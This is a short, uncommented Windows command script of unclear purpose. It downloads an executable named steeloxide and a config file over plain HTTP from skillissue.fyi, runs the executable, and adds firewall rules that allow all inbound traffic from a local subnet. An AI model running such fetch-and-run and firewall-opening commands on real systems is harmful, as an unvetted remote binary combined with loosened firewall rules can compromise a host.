curl.exe http://skillissue.fyi/steeloxide -o steeloxide
curl.exe http://skillissue.fyi/next.json -o next.json
curl.exe http://skillissue.fyi/sysinternals.zip -o sysinternals.zip
./steeloxide.exe preset --config next.json
C:\Windows\System32\netsh.exe advfirewall firewall add rule name="Cloud" action=allow protocol=any dir=in localip=any remoteip=192.168.12.0/24
C:\Windows\System32\netsh.exe advfirewall firewall add rule name="Cloud" action=allow protocol=any dir=in localip=192.168.12.0/24 remoteip=any